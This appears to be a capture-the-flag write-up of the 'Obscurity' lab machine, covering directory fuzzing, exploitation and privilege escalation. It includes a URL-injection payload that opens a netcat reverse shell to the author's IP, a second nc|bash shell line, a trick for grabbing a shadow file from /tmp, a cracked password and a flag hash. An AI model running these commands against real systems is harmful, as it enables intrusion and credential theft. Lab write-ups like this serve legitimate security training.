---
title: Obscurity
published: true
categories: [box, ldap, windows]
---
![](/htb_box/img/2020-06-09-12-15-16.png)

  - [Enumeration](#enumeration)
  - [Exploits - Work](#exploits---work)
  - [User](#user)
  - [PrivEsc](#privesc)
  - [Root](#root)
## Enumeration 

This should be a fairly simple box. The homepage for this box tells where we have to look.

![](/htb_box/img/2019-12-02-12-57-05.png)

Using wfuzz and dirbuster to identify the directory that SuperSecureServer.py resides.

    # wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
    Develop

Going to the url http://10.10.10.168:8080/develop/SuperSecureServer.py gives the source for the python.



SecThruObsFTW
## Exploits - Work

The python code with execute whatever python code is in the url which can be shown by executing it locally and doing

    http://localhost/' + str(os.system("whoami")) + '
    root
That shows it executes only printing remotely which means no output

    http://10.10.10.168:8080/' + str(os.system("nc 10.10.16.92 446 | bash | nc 10.10.16.92 443")) + '

Got a shell as www-data which means I need to privesc to the user which is robert

There are several files in /home/robert that indicate there is some crypto done.

SuperSecureCrypt.py
out.txt
check.txt
nc 10.10.16.92 4499 & | bash | nc 10.10.16.92 4488 &

## PrivEsc

After using su to become robert privesc command sudo -l shows that 

    sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py

In BetterSSH.py source shows the shadow file is temporarily linked to the tmp directory so you have to watch the tmp directory while running the sudo, time for a script

    watch -g -n 0.1 ls /tmp/SSH 
    cat /tmp/SSH/*

Running that after doing the sudo betterssh.py 

![](/htb_box/img/2019-12-02-15-16-58.png)
![](/htb_box/img/2019-12-02-15-17-22.png)

Cracking the hash gives `mercedes`

## Root
>512fd4429f33a113a44d5acde23609e3
